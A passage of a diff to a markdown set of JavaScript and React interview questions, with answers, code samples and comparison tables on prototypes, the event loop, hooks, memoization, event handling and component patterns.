+    // Prototype chain: dog → animal → Object.prototype → null
+    ```
+
+    ```js
+    function Person(name) { this.name = name; }
+    Person.prototype.greet = function() { console.log(`Hello, I'm ${this.name}`); };
+
+    const p1 = new Person("Mohamed");
+    p1.greet(); // "Hello, I'm Mohamed"
+    // p1 owns `name`; `greet` lives on Person.prototype (shared by all instances)
+    ```
+
+    | Term | Description |
+    | --- | --- |
+    | `[[Prototype]]` | Internal link to the prototype object |
+    | `__proto__` | Accessor for `[[Prototype]]` (legacy — avoid in production) |
+    | `Object.getPrototypeOf(obj)` | Standard way to read the prototype |
+    | `Object.create(proto)` | Create an object with a specific prototype |
+    | `Constructor.prototype` | Shared object assigned as `[[Prototype]]` of all instances |
+
+50. What is Prototypal Inheritance? (Detailed)
+    - JavaScript's mechanism where **objects inherit directly from other objects** (not classes). An object can access properties and methods anywhere on its prototype chain.
+
+    ```js
+    // Object-based inheritance
+    const vehicle = {
+      type: "vehicle",
+      describe() { console.log(`I am a ${this.type}`); }
+    };
+    const car = Object.create(vehicle);
+    car.type = "car";
+    car.drive = function() { console.log("Vroom!"); };
+
+    car.describe(); // "I am a car" — inherited method, overridden property
+    car.drive();    // "Vroom!" — own method
+
+    // Prototype chain: car → vehicle → Object.prototype → null
+    ```
+
+    ```js
+    // Class syntax — syntactic sugar over prototypal inheritance
+    class Animal {
+      constructor(name) { this.name = name; }
+      speak() { console.log(`${this.name} makes a sound.`); }
+    }
+    class Dog extends Animal {
+      speak() { console.log(`${this.name} barks.`); } // override
+    }
+
+    const d = new Dog("Rex");
+    d.speak();                    // "Rex barks."
+    console.log(d instanceof Animal); // true
+    ```
+
+    | Classical Inheritance | Prototypal Inheritance (JS) |
+    | --- | --- |
+    | Classes are blueprints; objects are instances | Objects inherit directly from other objects |
+    | `extends` creates a class hierarchy | `[[Prototype]]` chain links objects |
+    | Methods copied per instance | Methods shared via prototype chain (memory-efficient) |
+
+---
+
+### Output Questions
+
+51. What is the output? — Event Loop & Async execution order
+
+    ```js
+    console.log("Start");
+
+    setTimeout(() => console.log("Timeout"), 0);
+
+    queueMicrotask(() => console.log("Microtask"));
+
+    Promise.resolve().then(() => console.log("Promise"));
+
+    console.log("End");
+    ```
+
+    **Output:**
+    ```
+    Start
+    End
+    Microtask
+    Promise
+    Timeout
+    ```
+
+    **Why — step by step:**
+    1. `console.log("Start")` → sync, runs immediately.
+    2. `setTimeout(...)` → registered in Web API, callback moves to **Macrotask Queue** after 0ms.
+    3. `queueMicrotask(...)` → callback pushed to **Microtask Queue**.
+    4. `Promise.resolve().then(...)` → `.then` callback pushed to **Microtask Queue**.
+    5. `console.log("End")` → sync, runs immediately.
+    6. Call Stack is empty → drain **Microtask Queue** completely first → `Microtask`, then `Promise`.
+    7. Pick one task from **Macrotask Queue** → `Timeout`.
+
+    | Queue | What goes in | Priority |
+    | --- | --- | --- |
+    | Call Stack | Synchronous code | Runs first |
+    | Microtask Queue | `Promise.then`, `queueMicrotask`, `async/await` | Before any macrotask |
+    | Macrotask Queue | `setTimeout`, `setInterval`, I/O | After all microtasks |
+
+52. What is the output? — String immutability
+
+    ```js
+    let check = "hello";
+    check[0] = "x";
+    console.log(check);
+    ```
+
+    **Output:**
+    ```
+    hello
+    ```
+
+    **Why?**
+    - Strings in JavaScript are **immutable** — individual characters cannot be reassigned.
+    - `check[0] = "x"` silently does nothing (in strict mode it throws a `TypeError`).
+    - The variable `check` still holds the original string `"hello"`.
+
+    **Correct way to modify a string:**
+    ```js
+    check = "x" + check.slice(1);
+    console.log(check); // "xello"
+
+    // Or using replace
+    check = check.replace("h", "x");
+    console.log(check); // "xello"
     ```
 
 ---
@@ -735,6 +1728,916 @@ This repo is collaborative — feel free to contribute more questions 🚀
 
 ---
 
+### Advanced Concepts
+
+24. What are Error Boundaries in React?
+    - Error Boundaries catch JavaScript errors anywhere in their child component tree, log them, and display a fallback UI instead of crashing.
+    - ⚠️ **Error Boundaries can ONLY be class components** — there is no function component equivalent for `componentDidCatch`. You cannot build an error boundary with hooks.
+
+    ```jsx
+    class ErrorBoundary extends React.Component {
+      constructor(props) {
+        super(props);
+        this.state = { hasError: false };
+      }
+
+      static getDerivedStateFromError(error) {
+        return { hasError: true }; // triggers fallback render
+      }
+
+      componentDidCatch(error, info) {
+        console.error("Caught error:", error, info);
+      }
+
+      render() {
+        if (this.state.hasError) return <h2>Something went wrong.</h2>;
+        return this.props.children;
+      }
+    }
+
+    // Usage
+    <ErrorBoundary>
+      <MyComponent />
+    </ErrorBoundary>
+    ```
+
+    - Error boundaries do **not** catch: errors in event handlers, async code (`setTimeout`), SSR errors, or errors thrown inside the boundary itself.
+
+25. What are the types of components in React?
+
+    | Type | Description |
+    | --- | --- |
+    | **Functional Component** | JS function returning JSX — modern standard, uses hooks |
+    | **Class Component** | ES6 class extending `React.Component` — uses lifecycle methods |
+    | **Pure Component** | Class with built-in shallow prop/state comparison (`PureComponent`) |
+    | **Higher-Order Component (HOC)** | Function that takes a component and returns an enhanced component |
+    | **Controlled Component** | Form value driven by React state |
+    | **Uncontrolled Component** | Form value managed by DOM via `useRef` |
+    | **Server Component** | Renders on the server, no interactivity (React 18+ / Next.js) |
+
+    ```jsx
+    // Functional
+    const Hello = ({ name }) => <h1>Hello, {name}</h1>;
+
+    // Class
+    class Hello extends React.Component {
+      render() { return <h1>Hello, {this.props.name}</h1>; }
+    }
+
+    // HOC
+    const withLogger = (Component) => (props) => {
+      console.log("Rendering", Component.name);
+      return <Component {...props} />;
+    };
+    ```
+
+26. What is React Fiber?
+    - React Fiber is the **reimplementation of React's reconciliation engine** (React 16+). It breaks rendering into small units of work that can be **paused, resumed, or discarded** based on priority.
+
+    | Before Fiber (Stack Reconciler) | After Fiber |
+    | --- | --- |
+    | Synchronous — could not be interrupted | Asynchronous — can pause and resume |
+    | One large render call | Split into incremental units of work |
+    | Blocked the main thread for large trees | Yields to browser between units |
+
+    - Powers **Concurrent Mode**, **Suspense**, **Error Boundaries**, and **Time Slicing**.
+    - High-priority updates (user input) can interrupt low-priority renders (data fetching).
+
+27. What are React optimization techniques?
+    - **`React.memo`** — skip re-render of a component when its props haven't changed.
+    - **`useMemo`** — memoize expensive computed values.
+    - **`useCallback`** — memoize function references passed as props.
+    - **Code splitting** — `React.lazy` + `Suspense` to load components on demand.
+    - **Virtualization** — render only visible rows in long lists (`react-window`).
+    - **Avoid anonymous functions in JSX** — they create new references every render.
+    - **Stable `key` props** — use unique IDs, not array indexes.
+    - **Debounce/throttle** — limit expensive event handler execution rate.
+    - **Production build** — `npm run build` enables minification and dead-code removal.
+
+28. What is debouncing and throttling?
+    - **Debouncing:** Delays execution until after a pause since the last call. Only the final call fires.
+    - **Throttling:** Limits execution to **at most once** per time interval regardless of call frequency.
+
+    | | Debounce | Throttle |
+    | --- | --- | --- |
+    | Fires | After pause since last call | At most once per interval |
+    | Rapid calls | Only last call executes | First call fires; rest skipped until interval passes |
+    | Use case | Search input, form validation | Scroll, resize, button spam |
+
+    ```jsx
+    // Debounce — waits for user to stop typing
+    const debounce = (fn, delay) => {
+      let timer;
+      return (...args) => {
+        clearTimeout(timer);
+        timer = setTimeout(() => fn(...args), delay);
+      };
+    };
+
+    // Throttle — fires at most once per second
+    const throttle = (fn, limit) => {
+      let lastCall = 0;
+      return (...args) => {
+        const now = Date.now();
+        if (now - lastCall >= limit) { lastCall = now; fn(...args); }
+      };
+    };
+    ```
+
+29. Throttle a button click using only arrow functions (no `useRef`)
+    - Use a **module-level variable** outside the component as the timestamp store — it persists across re-renders without triggering them, and without needing `useRef`.
+
+    ```jsx
+    let lastCallTime = 0; // module-level — persists across renders
+
+    const ThrottledButton = () => {
+      const handleClick = () => {
+        const now = Date.now();
+        if (now - lastCallTime >= 1000) {
+          lastCallTime = now;
+          console.log("Action fired at", new Date().toLocaleTimeString());
+        }
+      };
+
+      return <button onClick={handleClick}>Click Me (throttled 1s)</button>;
+    };
+    ```
+
+30. Custom Hook — `useToggle`
+    - A custom hook is a JS function starting with `use` that calls other hooks internally. It extracts and reuses stateful logic across components without changing the component tree.
+
+    ```jsx
+    import { useState } from "react";
+
+    // Custom hook
+    const useToggle = (initial = false) => {
+      const [value, setValue] = useState(initial);
+      const toggle = () => setValue(prev => !prev);
+      return [value, toggle];
+    };
+
+    // Usage
+    const Modal = () => {
+      const [isOpen, toggleOpen] = useToggle(false);
+      return (
+        <div>
+          <button onClick={toggleOpen}>{isOpen ? "Close" : "Open"} Modal</button>
+          {isOpen && <p>Modal is visible!</p>}
+        </div>
+      );
+    };
+    ```
+
+    - The hook encapsulates the `useState` + toggle logic — any component can reuse it with one line.
+
+31. Does React create a new Virtual DOM or update the existing one on re-render?
+    - React creates a **brand-new Virtual DOM tree** on every re-render.
+    - It then **diffs** the new tree against the previous snapshot (**reconciliation**).
+    - Only the actual differences are flushed to the **real DOM** — the old Virtual DOM is discarded.
+
+    ```
+    State or prop changes
+           ↓
+    New Virtual DOM tree built (cheap — plain JS objects)
+           ↓
+    Diff: new tree vs previous snapshot (reconciliation / React Fiber)
+           ↓
+    Minimal patch computed
+           ↓
+    Real DOM updated (only the changed nodes)
+    ```
+
+    - Building a new Virtual DOM is fast — it's just creating JS objects in memory.
+    - The real DOM is only touched for the actual differences, which is the expensive part that React minimizes.
+
+32. What is lifting state up in React?
+    - When sibling components need to share state, **move the state to their closest common parent** and pass it down as props with a callback to update it.
+
+    ```jsx
+    const Parent = () => {
+      const [text, setText] = useState("");
+      return (
+        <>
+          <Input onChange={setText} />
+          <Display value={text} />
+        </>
+      );
+    };
+
+    const Input = ({ onChange }) => (
+      <input placeholder="Type..." onChange={e => onChange(e.target.value)} />
+    );
+
+    const Display = ({ value }) => <p>You typed: <strong>{value}</strong></p>;
+    ```
+
+    - `Input` fires the parent's setter via the `onChange` prop — it owns no state.
+    - `Display` reads the value from the parent — both siblings stay in sync through shared parent state.
+
+33. What are `Suspense` and `React.lazy`? How do they enable code splitting?
+    - **`React.lazy()`** — dynamically imports a component, splitting it into a separate bundle chunk that loads only when first rendered.
+    - **`<Suspense>`** — wraps lazy components and shows a **fallback UI** while the chunk is being fetched.
+
+    ```jsx
+    import React, { Suspense, lazy } from "react";
+
+    const Dashboard = lazy(() => import("./Dashboard")); // separate chunk
+
+    const App = () => (
+      <Suspense fallback={<p>Loading...</p>}>
+        <Dashboard />
+      </Suspense>
+    );
+    ```
+
+    ```jsx
+    // Route-based code splitting
+    const Home    = lazy(() => import("./pages/Home"));
+    const Profile = lazy(() => import("./pages/Profile"));
+
+    <Suspense fallback={<Spinner />}>
+      <Routes>
+        <Route path="/"        element={<Home />} />
+        <Route path="/profile" element={<Profile />} />
+      </Routes>
+    </Suspense>
+    ```
+
+    - `React.lazy` only works with **default exports**.
+    - `<Suspense>` boundaries can be nested — each shows its own fallback independently.
+    - Result: smaller initial bundle — chunks download on demand as users navigate.
+
+34. `React.memo` vs `useMemo`
+
+    | | `React.memo` | `useMemo` |
+    | --- | --- | --- |
+    | Memoizes | Whole component (skips re-render) | A computed value |
+    | Where used | Wraps component definition | Inside component body |
+    | Compares | Previous vs new **props** | Dependency array |
+    | Returns | Memoized component | Memoized value |
+
+    ```jsx
+    // React.memo — child skips re-render if props unchanged
+    const Child = React.memo(({ count }) => {
+      console.log("Child rendered");
+      return <p>Count: {count}</p>;
+    });
+
+    // useMemo — skip expensive computation if deps unchanged
+    const Parent = () => {
+      const [num, setNum] = useState(10);
+
+      const doubled = useMemo(() => {
+        console.log("Computing...");
+        return num * 2;
+      }, [num]);
+
+      return <p>Doubled: {doubled}</p>;
+    };
+    ```
+
+    - Use `React.memo` to prevent a child component from re-rendering when its props are the same.
+    - Use `useMemo` to avoid recalculating an expensive value on every render.
+
+35. What is the difference between `useEffect` and `useLayoutEffect`?
+    - Both run after React updates the DOM — the difference is **when** they fire relative to the browser paint.
+
+    | | `useEffect` | `useLayoutEffect` |
+    | --- | --- | --- |
+    | Runs | After browser paints (async) | After DOM update, before browser paints (sync) |
+    | Blocks paint? | ❌ No | ✅ Yes |
+    | Use case | Fetch data, subscriptions, timers | Read/write DOM layout (avoid flicker) |
+    | Performance | Better for most cases | Can delay visual update if overused |
+
+    **What does "browser paint" mean?**
+    After React updates the DOM, the browser must convert those DOM changes into actual pixels on screen. It runs through: **Style → Layout (Reflow) → Paint → Composite**. Only after this step do users see the update. `useEffect` fires after all of this; `useLayoutEffect` fires before the paint step starts.
+
+    ```jsx
+    useLayoutEffect(() => {
+      // Runs before paint — safe to read/mutate DOM dimensions here
+      const width = ref.current.getBoundingClientRect().width;
+      if (width > 300) ref.current.style.color = "red"; // applied before user sees it
+    }, []);
+
+    useEffect(() => {
+      // Runs after paint — ideal for side effects that don't affect layout
+      fetch("/api/data").then(res => res.json()).then(setData);
+    }, []);
+    ```
+
+    - Prefer `useEffect` by default. Only reach for `useLayoutEffect` when you see a visible flicker caused by DOM measurements.
+
+36. What are React lifecycle methods? (Quick Reference)
+    - Every React component goes through **Mounting → Updating → Unmounting**.
+
+    | Phase | Class Method | Functional Equivalent |
+    | --- | --- | --- |
+    | Before render | `constructor()` | `useState()` initial value |
+    | Render | `render()` | Function body returns JSX |
+    | After mount | `componentDidMount()` | `useEffect(() => {}, [])` |
+    | After update | `componentDidUpdate()` | `useEffect(() => {}, [deps])` |
+    | Before unmount | `componentWillUnmount()` | Cleanup `return () => {}` in `useEffect` |
+    | Error catch | `componentDidCatch()` | No hooks equivalent — class only |
+
+    ```jsx
+    // All lifecycle phases in a functional component
+    const MyComponent = () => {
+      const [data, setData] = useState(null); // constructor equivalent
+
+      useEffect(() => {
+        fetch("/api").then(r => r.json()).then(setData); // componentDidMount
+
+        return () => { /* cleanup */ };                  // componentWillUnmount
+      }, []);
+
+      useEffect(() => {
+        console.log("data changed");                     // componentDidUpdate
+      }, [data]);
+
+      return <div>{data}</div>;                          // render
+    };
+    ```
+
+37. What are design patterns in React?
+    - Design patterns in React are **proven, reusable solutions to common structural and logic problems** in component architecture.
+
+    | Pattern | Purpose | Example |
+    | --- | --- | --- |
+    | **Container / Presentational** | Separate logic from UI | `UserContainer` fetches data, `UserCard` renders it |
+    | **Higher-Order Component (HOC)** | Enhance a component with extra behavior | `withAuth(Component)`, `withLogger(Component)` |
+    | **Render Props** | Share logic via a function prop | `<Mouse render={(pos) => <Dot x={pos.x} />} />` |
+    | **Custom Hook** | Extract and reuse stateful logic | `useFormValidation`, `useFetchData` |
+    | **Compound Component** | Components share implicit state | `<Select>` + `<Select.Option>` |
+    | **Provider / Context** | Share state without prop drilling | `ThemeProvider`, `AuthContext` |
+
+    ```jsx
+    // HOC pattern
+    const withLogger = (Component) => (props) => {
+      console.log(`Rendering: ${Component.name}`);
+      return <Component {...props} />;
+    };
+    const LoggedButton = withLogger(Button);
+
+    // Compound component pattern
+    const Tabs = ({ children }) => { /* manages active state */ };
+    Tabs.Tab = ({ label }) => { /* individual tab */ };
+
+    <Tabs>
+      <Tabs.Tab label="Home" />
+      <Tabs.Tab label="Profile" />
+    </Tabs>
+    ```
+
+38. What are design patterns? (General Definition)
+    - Design patterns are **reusable, named solutions to recurring problems** in software design. They are not finished code — they are templates that describe how to solve a class of problems.
+    - Coined by the "Gang of Four" (GoF) in *Design Patterns: Elements of Reusable Object-Oriented Software* (1994).
+
+    | Category | Description | Examples |
+    | --- | --- | --- |
+    | **Creational** | How objects are created | Singleton, Factory, Builder |
+    | **Structural** | How objects are composed | Adapter, Decorator, Proxy, HOC |
+    | **Behavioral** | How objects communicate | Observer, Strategy, Command |
+
+    - **Why use them?** Common vocabulary between developers, proven solutions, improved maintainability.
+    - In React: HOC = Decorator, Context = Observer, Render Props = Strategy.
+
+39. What is the difference between Babel and Webpack?
+
+    | | Babel | Webpack |
+    | --- | --- | --- |
+    | Role | **Transpiler** | **Bundler** |
+    | What it does | Converts modern JS/JSX → browser-compatible JS | Bundles many files into optimized output |
+    | Transforms | JSX, ES2022+, TypeScript syntax | Resolves imports, handles assets (CSS, images) |
+    | Output | Same number of files (transformed) | Fewer, optimized bundle files |
+    | Key features | Plugins, presets (`@babel/preset-react`) | Loaders, code splitting, tree shaking, HMR |
+
+    ```
+    Source files (.jsx, .ts, ES2022)
+           ↓
+         Babel — transforms syntax (JSX → JS, ES2022 → ES5)
+           ↓
+        Webpack — resolves imports, bundles, optimizes
+           ↓
+      dist/bundle.js (production-ready)
+    ```
+
+    - Modern tools like **Vite** use **esbuild** (for dev) + **Rollup** (for prod) and handle both roles, replacing the Babel + Webpack combo for many projects.
+
+40. What are the rules for creating custom hooks in React?
+    - **1. Name must start with `use`** — React uses this convention to identify hooks and enforce the rules of hooks linting.
+    - **2. Only call hooks at the top level** — never inside loops, conditions, or nested functions.
+    - **3. Only call hooks from function components or other custom hooks** — not from regular JS functions or class components.
+    - **4. One concern per hook** — keep hooks focused; extract multiple hooks if logic grows.
+    - **5. Return only what the consumer needs** — expose state values and setters/actions cleanly.
+
+    ```jsx
+    // ✅ Valid custom hook
+    const useFetch = (url) => {
+      const [data, setData] = useState(null);
+      const [loading, setLoading] = useState(true);
+
+      useEffect(() => {
+        fetch(url)
+          .then(r => r.json())
+          .then(d => { setData(d); setLoading(false); });
+      }, [url]);
+
+      return { data, loading };
+    };
+
+    // ❌ Invalid — hook called inside a condition
+    const useBad = (flag) => {
+      if (flag) {
+        const [x, setX] = useState(0); // breaks rules of hooks
+      }
+    };
+    ```
+
+41. How does event propagation work in React?
+    - React uses a **synthetic event system** — all events are delegated to the React root, not attached directly to DOM elements.
+    - Events still propagate through the same three phases: **Capture → Target → Bubble**.
+
+    ```jsx
+    // Bubbling (default)
+    const Parent = () => (
+      <div onClick={() => console.log("Parent")}>
+        <button onClick={() => console.log("Button")}>Click</button>
+      </div>
+    );
+    // Output: "Button" then "Parent" (bubble up)
+
+    // Stop propagation
+    <button onClick={(e) => { e.stopPropagation(); console.log("Only Button"); }}>
+      Click
+    </button>
+
+    // Capture phase — use onClickCapture
+    <div onClickCapture={() => console.log("Capture: Parent first")}>
+      <button onClick={() => console.log("Bubble: Button")}>Click</button>
+    </div>
+    // Output: "Capture: Parent first" → "Bubble: Button"
+    ```
+
+    - `e.stopPropagation()` — stops event from bubbling further up.
+    - `e.preventDefault()` — prevents default browser behavior (form submit, link navigate).
+    - `e.nativeEvent` — access the raw browser event if needed.
+
+42. How to do event delegation in React (optimized way)?
+    - React already applies event delegation internally at the root — individual element listeners bubble up to one root handler.
+    - For dynamic lists, use `data-*` attributes + `closest()` to identify which item was clicked without attaching per-item handlers.
+
+    ```jsx
+    const List = ({ items }) => {
+      const handleClick = (e) => {
+        const item = e.target.closest("[data-id]");
+        if (!item) return; // clicked outside any list item
+        console.log("Clicked ID:", item.dataset.id);
+        console.log("Clicked action:", item.dataset.action);
+      };
+
+      return (
+        <ul onClick={handleClick}>
+          {items.map(({ id, name }) => (
+            <li key={id} data-id={id} data-action="select">
+              {name}
+            </li>
+          ))}
+        </ul>
+      );
+    };
+    ```
+
+    - `closest("[data-id]")` walks up the DOM from the clicked element — safe even if the user clicks a nested `<span>` inside `<li>`.
+    - One handler for the entire list — O(1) listeners regardless of list size.
+
+43. What are Synthetic Events in React?
+    - A **SyntheticEvent** is React's cross-browser wrapper around the browser's native event. It normalizes event properties and behavior so they work consistently across all browsers.
+    - Same API as native events: `preventDefault()`, `stopPropagation()`, `target`, `currentTarget`, etc.
+    - In React 17+, events are **no longer pooled** (prior to React 17, event objects were reused from a pool and nullified after the handler — accessing them async would give `null`).
+
+    ```jsx
+    const handleClick = (e) => {
+      console.log(e.type);           // "click"
+      console.log(e.target);         // actual DOM element
+      console.log(e.currentTarget);  // element with the handler
+      e.preventDefault();            // normalized, works everywhere
+      e.stopPropagation();           // normalized, works everywhere
+
+      // React 17+ — event not pooled, safe to access async
+      setTimeout(() => console.log(e.type), 1000); // "click" — still accessible
+    };
+
+    // Access native event if needed
+    const handleNative = (e) => {
+      console.log(e.nativeEvent); // raw browser Event object
+    };
+    ```
+
+    | Native Event | Synthetic Event |
+    | --- | --- |
+    | Browser-specific inconsistencies | Normalized across all browsers |
+    | Attached directly to DOM elements | Delegated to React root |
+    | `event.which`, `keyCode` (legacy) | `event.key` (standardized) |
+    | Manual cleanup needed | Handled by React automatically |
+
+44. How to track scroll position in React?
+    - Three common approaches depending on whether you need global or element-level scroll tracking.
+
+    ```jsx
+    // 1. Global scroll — window scroll position
+    const ScrollTracker = () => {
+      const [scrollY, setScrollY] = useState(0);
+
+      useEffect(() => {
+        const handleScroll = () => setScrollY(window.scrollY);
+        window.addEventListener("scroll", handleScroll, { passive: true });
+        return () => window.removeEventListener("scroll", handleScroll);
+      }, []);
+
+      return <p>Scrolled: {scrollY}px from top</p>;
+    };
+    ```
+
+    ```jsx
+    // 2. Element scroll — scrollable container
+    const Box = () => {
+      const [scrollTop, setScrollTop] = useState(0);
+
+      return (
+        <div
+          style={{ height: 200, overflow: "auto" }}
+          onScroll={(e) => setScrollTop(e.currentTarget.scrollTop)}
+        >
+          <p style={{ position: "sticky", top: 0 }}>Top: {scrollTop}px</p>
+          <div style={{ height: 1000 }}>Tall content...</div>
+        </div>
+      );
+    };
+    ```
+
+    ```jsx
+    // 3. Custom hook — reusable across components
+    const useScrollPosition = () => {
+      const [scrollY, setScrollY] = useState(0);
+
+      useEffect(() => {
+        const onScroll = () => setScrollY(window.scrollY);
+        window.addEventListener("scroll", onScroll, { passive: true });
+        return () => window.removeEventListener("scroll", onScroll);
+      }, []);
+
+      return scrollY;
+    };
+
+    // Usage — sticky header after 50px scroll
+    const Header = () => {
+      const scrollY = useScrollPosition();
+      return (
+        <header style={{ position: scrollY > 50 ? "fixed" : "relative" }}>
+          Nav
+        </header>
+      );
+    };
+    ```
+
+    - Always use `{ passive: true }` in `addEventListener` for scroll events — it tells the browser you won't call `preventDefault()`, enabling performance optimizations.
+    - Always clean up the listener in the `useEffect` return to avoid memory leaks.
+
+---
+
+### Best Practices & Patterns
+
+45. Is this a correct HOC syntax? How does HOC work?
+    - Yes, the syntax is valid. There are two ways to write HOCs — the user's inline prop style, and the classic function-wrapping style.
+
+    ```jsx
+    // ✅ Inline prop style (your version) — passes component as a prop
+    const HOC = ({ Comp, openTonetwork }) => {
+      return openTonetwork ? <div><Comp /></div> : <Comp />;
+    };
+
+    const Profile = () => <div>Profile</div>;
+
+    const Parent = () => (
+      <>
+        <div>test</div>
+        <HOC Comp={Profile} openTonetwork={true} />
+      </>
+    );
+    ```
+
+    ```jsx
+    // ✅ Classic HOC style — function returns a new component (more reusable)
+    const withNetwork = (Component) => {
+      return function WrappedComponent(props) {
+        const [isOnline, setIsOnline] = useState(navigator.onLine);
+        return isOnline ? <Component {...props} /> : <p>You are offline</p>;
+      };
+    };
+
+    const ProfileWithNetwork = withNetwork(Profile);
+
+    // Usage — looks like a regular component
+    <ProfileWithNetwork name="Mohamed" />
+    ```
+
+    | Style | When to use |
+    | --- | --- |
+    | Inline prop (`Comp={Profile}`) | Simple wrappers, quick conditional rendering |
+    | Classic `withX(Component)` | Reusable behavior across many components (auth, logging, theming) |
+
+    - Classic HOC convention: name the wrapping function `withSomething` and spread `{...props}` to avoid breaking the wrapped component's own props.
+
+46. Single Responsibility Principle (SRP) in React
+    - **One component should do ONE job.** If a component is fetching data, managing form state, and rendering a list all at once — break it apart.
+
+    ```jsx
+    // ❌ Bad — one component doing everything
+    const UserPage = () => {
+      const [users, setUsers] = useState([]);
+      useEffect(() => {
+        fetch("/api/users").then(r => r.json()).then(setUsers);
+      }, []);
+      const handleDelete = (id) => { /* ... */ };
+      return (
+        <ul>
+          {users.map(u => (
+            <li key={u.id}>{u.name}
+              <button onClick={() => handleDelete(u.id)}>Delete</button>
+            </li>
+          ))}
+        </ul>
+      );
+    };
+    ```
+
+    ```jsx
+    // ✅ Good — each unit has one job
+    const useUsers = () => {               // hook: data fetching only
+      const [users, setUsers] = useState([]);
+      useEffect(() => {
+        fetch("/api/users").then(r => r.json()).then(setUsers);
+      }, []);
+      return users;
+    };
+
+    const UserItem = ({ user, onDelete }) => ( // component: render one item
+      <li>{user.name} <button onClick={() => onDelete(user.id)}>Delete</button></li>
+    );
+
+    const UserList = ({ users, onDelete }) => ( // component: render list
+      <ul>{users.map(u => <UserItem key={u.id} user={u} onDelete={onDelete} />)}</ul>
+    );
+
+    const UserPage = () => {               // component: orchestrate only
+      const users = useUsers();
+      const handleDelete = (id) => { /* ... */ };
+      return <UserList users={users} onDelete={handleDelete} />;
+    };
+    ```
+
+    - **Rule of thumb:** If you need to say "and" to describe what a component does, it's doing too much.
+
+47. State mutation rules — never mutate directly
+    - React uses **reference equality** to detect changes. If you mutate the existing object/array, the reference stays the same — React won't know the state changed and **won't re-render**.
+
+    ```jsx
+    // ❌ Wrong — mutating the existing array (same reference)
+    const addItem = () => {
+      items.push("new item"); // mutates original array
+      setItems(items);        // same reference → React skips re-render
+    };
+
+    // ✅ Correct — create a new array (new reference)
+    const addItem = () => setItems([...items, "new item"]);
+    const removeItem = (id) => setItems(items.filter(item => item.id !== id));
+
+    // ❌ Wrong — mutating object state
+    const updateUser = () => {
+      user.name = "John"; // mutates original object
+      setUser(user);      // same reference → no re-render
+    };
+
+    // ✅ Correct — spread to create a new object
+    const updateUser = () => setUser({ ...user, name: "John" });
+    ```
+
+    **When to use state:**
+
+    | Use state ✅ | Don't use state ❌ |
+    | --- | --- |
+    | Local data that changes and affects UI | Data that never changes (use `const`) |
+    | Form input values | Data derived from other state (compute in render) |
+    | Toggle flags (isOpen, isLoading) | Data needed by many distant components (use Context) |
+
+48. Hooks rules — top level, dependencies, and cleanup
+    - **Rule 1 — Top level only:** Never call hooks inside `if`, `for`, or nested functions. React relies on the order hooks are called — changing order breaks things.
+
+    ```jsx
+    // ❌ Wrong — hook inside a condition
+    const MyComp = ({ flag }) => {
+      if (flag) {
+        const [x, setX] = useState(0); // breaks rules — order not guaranteed
+      }
+    };
+
+    // ✅ Correct — always at top level, condition inside
+    const MyComp = ({ flag }) => {
+      const [x, setX] = useState(0);
+      if (!flag) return null;
+      return <div>{x}</div>;
+    };
+    ```
+
+    - **Rule 2 — Declare all dependencies:** Everything used inside `useEffect` that comes from the component scope must be in the deps array, or you risk stale closures.
+
+    ```jsx
+    // ❌ Wrong — missing dependency (stale closure bug)
+    useEffect(() => {
+      console.log(userId); // reads stale userId
+    }, []); // userId not listed
+
+    // ✅ Correct
+    useEffect(() => {
+      console.log(userId);
+    }, [userId]); // re-runs whenever userId changes
+    ```
+
+    - **Rule 3 — Extract reusable logic:** If two components share the same `useEffect` + `useState` pattern, extract it into a custom hook.
+
+49. When does the `useEffect` cleanup function run?
+    - The function you `return` from `useEffect` runs in **two situations**:
+      1. **Before the component unmounts** (removed from DOM).
+      2. **Before the effect runs again** — when a dependency changes, the previous cleanup runs first, then the new effect runs.
+
+    ```jsx
+    useEffect(() => {
+      const handleResize = () => console.log("resized");
+      window.addEventListener("resize", handleResize);
+
+      return () => {
+        window.removeEventListener("resize", handleResize); // cleanup
+      };
+    }, []); // [] = no deps → cleanup only on unmount
+    ```
+
+    ```jsx
+    // With a dependency — cleanup runs on every userId change
+    useEffect(() => {
+      const sub = subscribeToUser(userId);
+      console.log("Subscribed to", userId);
+
+      return () => {
+        sub.unsubscribe();
+        console.log("Unsubscribed from", userId); // runs before re-subscribing
+      };
+    }, [userId]);
+
+    // Timeline when userId changes from 1 → 2:
+    // 1. cleanup (unsubscribe from 1) ← return fn runs
+    // 2. effect (subscribe to 2) ← effect runs again
+    ```
+
+    **When to always write cleanup:**
+
+    | Side effect | Cleanup needed |
+    | --- | --- |
+    | `addEventListener` | `removeEventListener` |
+    | `setInterval` / `setTimeout` | `clearInterval` / `clearTimeout` |
+    | WebSocket / subscription | `.close()` / `.unsubscribe()` |
+    | Fetch (to cancel in-flight request) | `AbortController.abort()` |
+
+50. Performance optimizations — `React.memo`, `useCallback`, `useMemo`, debounce, lazy
+    - **`React.memo`** — wraps a component to skip re-render if props haven't changed (shallow compare).
+
+    ```jsx
+    // Without memo — re-renders every time Parent re-renders, even if count unchanged
+    const Child = ({ count }) => { console.log("render"); return <p>{count}</p>; };
+
+    // With memo — skips re-render if count prop is the same
+    const Child = React.memo(({ count }) => { console.log("render"); return <p>{count}</p>; });
+    ```
+
+    - **`useCallback`** — memoizes a function so its reference doesn't change on every render. Pair with `React.memo` on child components.
+
+    ```jsx
+    // ❌ Without useCallback — new function reference every render → Child always re-renders
+    const handleClick = () => doSomething(id);
+
+    // ✅ With useCallback — stable reference, Child only re-renders when id changes
+    const handleClick = useCallback(() => doSomething(id), [id]);
+    ```
+
+    - **`useMemo`** — memoizes an expensive computed value, only recalculates when deps change.
+
+    ```jsx
+    // Expensive filter only re-runs when search or products changes
+    const filtered = useMemo(
+      () => products.filter(p => p.name.includes(search)),
+      [products, search]
+    );
+    ```
+
+    - **Debounce/throttle** — limit how often an expensive handler fires.
+
+    ```jsx
+    const debouncedSearch = useMemo(() => debounce((q) => fetchResults(q), 400), []);
+    <input onChange={e => debouncedSearch(e.target.value)} />
+    ```
+
+    - **`React.lazy` + `Suspense`** — split code into chunks, load only when needed.
+
+    ```jsx
+    const Settings = lazy(() => import("./Settings"));
+    <Suspense fallback={<Spinner />}><Settings /></Suspense>
+    ```
+
+51. Avoid inline functions and objects in JSX
+    - Every time a component renders, a new function or object literal is created in memory. When passed as props to a child wrapped in `React.memo`, it breaks memoization — the child always sees a "new" prop.
+
+    ```jsx
+    // ❌ New function reference on every render → React.memo on Child is useless
+    <Child onClick={() => handleClick(id)} />
+    <Child style={{ color: "red" }} />
+
+    // ✅ Stable references — memoize them
+    const handleChildClick = useCallback(() => handleClick(id), [id]);
